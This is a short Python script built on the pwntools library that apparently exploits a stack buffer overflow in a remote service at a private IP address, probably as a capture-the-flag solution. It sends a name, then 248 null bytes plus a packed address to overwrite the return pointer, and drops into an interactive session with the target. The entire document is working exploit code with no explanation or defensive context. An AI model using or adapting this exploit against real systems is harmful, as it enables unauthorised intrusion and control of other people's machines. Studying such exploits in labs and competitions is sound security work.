from pwn import *
HOST = '10.12.153.73'
PORT = 11608

p=remote(HOST,PORT)
p.recvuntil("Enter your name:")
p.sendline('DSY')
p.recvuntil("Enter your comment:")
payload=b'\x00'*248 + p64(20150972)
p.send(payload)
p.interactive()
